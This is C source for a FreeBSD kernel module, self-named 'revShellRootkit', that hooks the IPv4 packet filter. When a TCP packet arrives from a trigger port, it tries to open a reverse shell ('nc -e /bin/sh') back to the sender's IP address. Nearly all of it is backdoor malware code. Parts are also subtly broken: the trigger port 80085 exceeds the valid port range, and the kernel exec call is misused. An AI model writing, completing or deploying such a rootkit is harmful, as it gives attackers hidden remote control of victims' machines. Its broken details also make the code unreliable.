#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/socketvar.h>
#include <sys/protosw.h>
#include <sys/systm.h>
#include <sys/types.h>
#include <sys/mbuf.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/exec.h>
#include <net/pfil.h>

#define TRIGGER_PORT 80085

static int attacker_ports[] = {22, 80, 443, 8080, 3306, 5432, 21, 25, 587, 53}; // List of target ports

// pfil_head is a list of the all the filtering functions applied to incoming/outgoing packets
// pfh_inet is the global IPv4 packet filtering subsystem
static struct pfil_head *pfh_inet;

// good till here





static int packet_filter(void *arg, struct mbuf **mp, struct ifnet *ifp, int dir, struct inpcb *inp) {
    struct mbuf *m = *mp;
    struct ip *ip_header;
    struct tcphdr *tcp_header;
    int i;

    // Ensure mbuf is valid
    if (m == NULL) return 0;

   // Make sure the packet has enough data for an IP header
    if (m->m_len < sizeof(struct ip)) {
        m = m_pullup(m, sizeof(struct ip));
        if (m == NULL) return 0;
    }
    
    // Extract the IP header
    ip_header = mtod(m, struct ip *);
    // Check if it's a TCP packet
    if (ip_header->ip_p != IPPROTO_TCP) return 0;

    // Ensure there's enough data for TCP header
    if (m->m_len < (ip_header->ip_hl << 2) + sizeof(struct tcphdr)) {
        m = m_pullup(m, (ip_header->ip_hl << 2) + sizeof(struct tcphdr));
        if (m == NULL) return 0;
    }

    // Extract the TCP header
    tcp_header = (struct tcphdr *)((caddr_t)ip_header + (ip_header->ip_hl << 2));

    // Check source port
    if (ntohs(tcp_header->th_sport) == TRIGGER_PORT) { 

        // Check if the destination port is in the list
        for (i = 0; i < sizeof(attacker_ports) / sizeof(int); i++) {
            if (ntohs(tcp_header->th_dport) == attacker_ports[i]) {

                // Extract attacker IP and store as a string (since inet_ntoa() isn't available in kernel space)
                char attacker_ip_str[16];
                    snprintf(attacker_ip_str, sizeof(attacker_ip_str), "%u.%u.%u.%u",
                    (ntohl(ip_header->ip_src.s_addr) >> 24) & 0xFF,
                    (ntohl(ip_header->ip_src.s_addr) >> 16) & 0xFF,
                    (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
                    ntohl(ip_header->ip_src.s_addr) & 0xFF);

                // Try this if the above gives issues
                // char attacker_ip_str[16];
                //     ksprintf(attacker_ip_str, "%u.%u.%u.%u",
                //     (ntohl(ip_header->ip_src.s_addr) >> 24) & 0xFF,
                //     (ntohl(ip_header->ip_src.s_addr) >> 16) & 0xFF,
                //     (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
                //     ntohl(ip_header->ip_src.s_addr) & 0xFF);

                // Construct the reverse shell command
                char reverse_shell_cmd[100];
                snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd), 
                    "nc -e /bin/sh %s 80085", attacker_ip_str);

                printf("[LKM] Triggering reverse shell to %s on port 80085\n", attacker_ip_str);
               
                struct thread *td = curthread;
                struct execve_args args;
                char *path = "/bin/sh";
                char *argv[] = {"/bin/sh", "-c", reverse_shell_cmd, NULL};
                char *envv[] = {NULL};

                // Set up execve_args properly
                args.fname = path;
                args.argv = argv;
                args.envv = envv;
                
                kern_execve(td, &args);
                break; // Stop after the first match
            }
        }
    }
    
    return 0;
}






// Load function: Attach our packet filter
static int load(void) {
    // Get the IPv4 packet filter hook
    pfh_inet = pfil_head_get(PFIL_TYPE_AF, AF_INET);
    if (pfh_inet != NULL) {
        // Creates a custom packet fitlering function packet_filter 
        pfil_add_hook(packet_filter, NULL, PFIL_IN | PFIL_WAITOK, pfh_inet);
    }
    printf("[LKM] Packet filter module loaded\n");
    return 0;
}

// Unload function: Remove our filter
static int unload(void) {
    if (pfh_inet != NULL) {
        pfil_remove_hook(packet_filter, NULL, PFIL_IN | PFIL_WAITOK, pfh_inet);
    }
    printf("[LKM] Packet filter module unloaded\n");
    return 0;
}

static int event_handler(struct module *module, int event, void *arg) {
    switch (event) {
        case MOD_LOAD:
            return load();
        case MOD_UNLOAD:
            return unload();
        default:
            return EOPNOTSUPP;
    }
}

static moduledata_t module_data = {
    "revShellRootkit",
    event_handler,
    NULL
};

DECLARE_MODULE(reverse_shell_lkm, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);




